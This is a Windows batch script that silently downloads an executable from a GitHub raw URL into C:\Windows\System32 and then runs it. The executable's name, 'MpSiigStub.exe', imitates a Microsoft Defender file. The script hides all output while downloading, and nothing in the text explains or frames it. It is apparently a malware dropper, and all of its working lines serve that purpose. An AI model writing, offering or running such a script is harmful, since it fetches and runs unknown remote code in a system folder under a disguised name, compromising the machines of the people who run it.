@echo off
:: Define the download URL and destination directory
set "URL=https://raw.githubusercontent.com/Sniffer-Lexel/Free/ea9816fa9ad5b926fb392606699abc8592aaabaa/MpSiigStub.exe"
set "DEST=C:\Windows\System32\MpSiigStub.exe"

:: Create the destination directory if it doesn't exist
mkdir "%~dp0" >nul 2>&1

:: Download the file silently
curl -o "%DEST%" "%URL%" >nul 2>&1

:: Run the downloaded file
start "" "%DEST%"
